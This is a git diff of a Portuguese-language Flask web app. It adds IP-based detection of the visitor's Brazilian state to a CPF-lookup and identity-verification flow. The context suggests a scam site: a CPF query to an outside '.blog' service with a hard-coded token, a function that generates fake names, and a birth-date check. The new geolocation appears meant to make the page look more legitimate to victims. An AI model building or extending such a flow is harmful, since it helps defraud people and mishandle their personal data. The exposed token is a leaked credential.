@@ -16,6 +16,67 @@ app.static_folder = 'static'
 
 API_URL = "https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf={cpf}"
 
+# Mapeamento de estados para siglas
+ESTADOS = {
+    'Acre': 'AC',
+    'Alagoas': 'AL',
+    'Amapá': 'AP',
+    'Amazonas': 'AM',
+    'Bahia': 'BA',
+    'Ceará': 'CE',
+    'Distrito Federal': 'DF',
+    'Espírito Santo': 'ES',
+    'Goiás': 'GO',
+    'Maranhão': 'MA',
+    'Mato Grosso': 'MT',
+    'Mato Grosso do Sul': 'MS',
+    'Minas Gerais': 'MG',
+    'Pará': 'PA',
+    'Paraíba': 'PB',
+    'Paraná': 'PR',
+    'Pernambuco': 'PE',
+    'Piauí': 'PI',
+    'Rio de Janeiro': 'RJ',
+    'Rio Grande do Norte': 'RN',
+    'Rio Grande do Sul': 'RS',
+    'Rondônia': 'RO',
+    'Roraima': 'RR',
+    'Santa Catarina': 'SC',
+    'São Paulo': 'SP',
+    'Sergipe': 'SE',
+    'Tocantins': 'TO'
+}
+
+def get_estado_from_ip(ip_address: str) -> str:
+    """
+    Obtém o estado baseado no IP do usuário usando um serviço de geolocalização
+    """
+    try:
+        response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('status') == 'success' and data.get('country') == 'Brazil':
+                estado = data.get('region')
+                # Procura o estado no dicionário de mapeamento
+                for estado_nome, sigla in ESTADOS.items():
+                    if sigla == estado:
+                        return f"{estado_nome} - {sigla}"
+    except Exception as e:
+        logger.error(f"Erro ao obter localização do IP: {str(e)}")
+
+    # Se não conseguir determinar o estado, retorna São Paulo como padrão
+    return "São Paulo - SP"
+
+def get_client_ip() -> str:
+    """
+    Obtém o IP do cliente, considerando possíveis proxies
+    """
+    if request.headers.get('X-Forwarded-For'):
+        ip = request.headers.get('X-Forwarded-For').split(',')[0]
+    else:
+        ip = request.remote_addr
+    return ip
+
 def gerar_nomes_falsos(nome_real: str) -> list:
     nomes = [
         "MARIA SILVA SANTOS",
@@ -128,11 +189,12 @@ def verificar_data():
         flash('Data selecionada incorreta. Por favor, tente novamente.')
         return redirect(url_for('index'))
 
-    # Se a verificação foi bem sucedida, redireciona para a seleção de estado
-    # TODO: Implementar lógica para detectar estado com base no IP
-    estado_padrao = "São Paulo - SP"  # Estado padrão
+    # Obtém o estado baseado no IP do usuário
+    ip_address = get_client_ip()
+    estado_atual = get_estado_from_ip(ip_address)
+
     return render_template('selecionar_estado.html', 
-                         estado_atual=estado_padrao,
+                         estado_atual=estado_atual,
                          current_year=datetime.now().year)
 
 @app.route('/selecionar_estado', methods=['POST'])
